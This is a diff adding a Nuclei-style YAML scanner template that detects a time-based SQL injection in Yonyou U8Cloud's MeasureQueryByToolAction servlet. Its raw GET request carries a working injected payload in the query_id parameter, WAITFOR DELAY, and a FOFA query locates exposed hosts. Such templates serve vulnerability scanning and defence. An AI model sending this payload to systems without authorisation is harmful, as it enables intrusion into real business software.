@@ -1,0 +1,27 @@
+id: yonyou-u8-cloud-measurequerybytoolaction-sqli
+
+info:
+  name: Yonyou U8Cloud MeasureQueryByToolAction - SQL Injection
+  author: qwtd
+  severity: high
+  description: Detects SQL Injection vulnerability in Yonyou U8Cloud MeasureQueryByToolAction.
+  reference:
+    https://github.com/wy876/POC/commit/a60fe5bafa49a5df1badb7e5100be1fa5d2575ed
+  metadata:
+    fofa-query: app="用友-U8-Cloud"
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryByToolAction&method=execute&query_id=1%27);WAITFOR+DELAY+%270:0:6%27--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+          - 'status_code == 200'
+          - 'contains(body, "相应指标查询条件不存在")'
+        condition: and
